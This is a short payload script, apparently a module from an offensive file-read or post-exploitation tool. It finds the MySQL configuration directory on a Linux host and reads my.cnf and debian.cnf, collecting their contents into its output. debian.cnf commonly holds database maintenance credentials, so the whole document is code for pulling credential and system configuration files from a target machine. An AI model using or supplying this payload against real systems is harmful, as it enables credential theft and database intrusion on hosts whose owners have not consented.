#REQUIRE_LINUX
#This payload shows MySQL configuration files.
result = []
files = []

files.append('my.cnf')
files.append('debian.cnf')

directory = run_payload('mysql_config_directory')
for file in files:
    if read(directory+file) != '':
        result.append('-------------------------')
        result.append('FILE => '+directory+file)
        result.append(read(directory+file))

result = [p for p in result if p != '']
